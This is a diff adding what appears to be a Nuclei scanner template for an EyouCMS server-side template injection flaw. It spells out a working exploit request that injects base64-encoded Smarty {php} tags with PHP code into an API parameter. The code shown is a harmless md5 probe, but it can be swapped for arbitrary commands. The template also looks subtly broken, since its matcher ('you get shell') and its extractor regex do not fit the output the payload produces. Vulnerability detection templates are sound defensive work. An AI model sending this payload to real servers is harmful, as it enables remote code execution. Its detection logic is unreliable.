@@ -1,0 +1,40 @@
+id: eyoucms-ssti
+info:
+  name: EyouCMS < 1.4.2 SSTI
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The execution of EyouCMS arbitrary commands can cause the attacker to obtain server permissions and control the server.
+  reference:
+    - http://www.lovei.org/archives/EyouCMS-SSTI.html
+  tags: rce
+variables:
+  php_code: "echo md5(123);"
+http:
+  - method: POST
+    path:
+      - "/index.php?m=api&c=Ajax&a=get_tag_memberlist"
+    headers:
+      Accept-Encoding: "gzip, deflate"
+      X-Requested-With: "XMLHttpRequest"
+      Accept: "*/*"
+      Accept-Language: "en"
+      Connection: "close"
+      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: |
+      htmlcode=zhang&attarray={{base64(concat('{"}":"{php}', php_code, ';{/php}"}'))}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "you get shell"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "script>=\\'(.*?)\\' "
